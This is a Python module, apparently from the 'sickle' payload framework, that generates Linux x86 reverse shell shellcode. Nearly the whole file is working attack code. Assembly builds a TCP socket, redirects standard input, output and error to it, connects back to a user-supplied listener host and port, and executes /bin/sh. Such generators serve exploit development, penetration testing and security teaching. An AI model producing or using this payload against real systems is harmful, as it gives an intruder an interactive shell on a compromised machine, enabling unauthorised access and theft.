import sys
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings
from sickle.common.lib.programmer import builder

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.linux import (
    net,
    bits_socket,
)

class Shellcode():

    arch = "x86"

    platform = "linux"

    name = f"Linux ({arch}) SH Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Ubuntu 5.4.0-6ubuntu1~16.04.12"]

    summary = ("Reverse shell via TCP over IPV4 that provides an interactive /bin/sh"
               " session")

    description = ("A TCP-based reverse shell over IPv4 that provides an interactive /bin/sh"
                   " session. Since this payload is not staged, there is no need for anything"
                   " more than a Netcat listener.")

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.syscalls = mappings.get_linux_syscalls(["socketcall",
                                                     "dup2",
                                                     "execve"])

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
        sin_port = struct.pack('<H', lport).hex()
        sin_family = struct.pack('>H', bits_socket.AF_INET).hex()

        source_code = f"""
        start:
            ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
            ;             int call,            // EBX => SYS_SOCKET
            ;             unsigned long *args) // ECX => *(int domain, int type, protocol)
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx                                ; Store the call type of SYS_SOCKET into EBX
            push ebx
            push {sin_family}
            mov ecx, esp                           ; Store pointer to args (AF_INET, SOCK_STREAM, IPPROTO_IP) into ECX
            mov al, {self.syscalls['socketcall']}
            int 0x80

            ; i = 2
            ; while (i <= 0)
            ;   dup2(sockfd, i--)
            xchg eax, ebx                          ; Save the socket file descriptor into ECX (sockfd)
            pop ecx                                ; Initialize the loop counter (0x2 was last pushed onto the stack)
        loop:
            mov al, {self.syscalls['dup2']}
            int 0x80
            dec ecx                                ; Decrement the loop counter
            jns loop

        connect:
            ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
            ;             int call,            // EBX => SYS_CONNECT
            ;             unsigned long *args) // ECX => *(sockfd, (struct sockaddr*), sizeof((struct sockaddr *))
            
            push {sin_addr}                        ; client.sin_addr.s_addr = inet_addr(LHOST)
            push 0x{sin_port}{sin_family}          ; client.sin_port = htons(LPORT)
                                                   ; client.sin_family = AF_INET
            mov ecx, esp                           ; Store the pointer to the sockaddr struct into ECX
            mov al, {self.syscalls['socketcall']}
            
            push eax                               ; sizeof(client)
            push ecx                               ; *args
            push ebx                               ; sockfd

            mov bl, {net.SYS_CONNECT}              
            
            mov ecx,esp                            ; Store pointer to args (sockfd, (struct sockaddr *)&client, sizeof(client)) into ECX
            int 0x80

        shell:
            ; int execve(const char *filename, // EBX => *"/bin/sh
            ;            char *const argv[],   // ECX => NULL
            ;            char *const envp[])   // EDX => NULL
            xor ecx, ecx
            push ecx
            push dword 0x68732f2f
            push dword 0x6e69622f ; Stack should not point to "/bin//sh"

            mov ebx,esp           ; Place pointer to "/bin//sh" into EBX
            mov al, {self.syscalls['execve']}            ; execve syscall
            int 0x80
        """

        return source_code

    def get_shellcode(self):

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
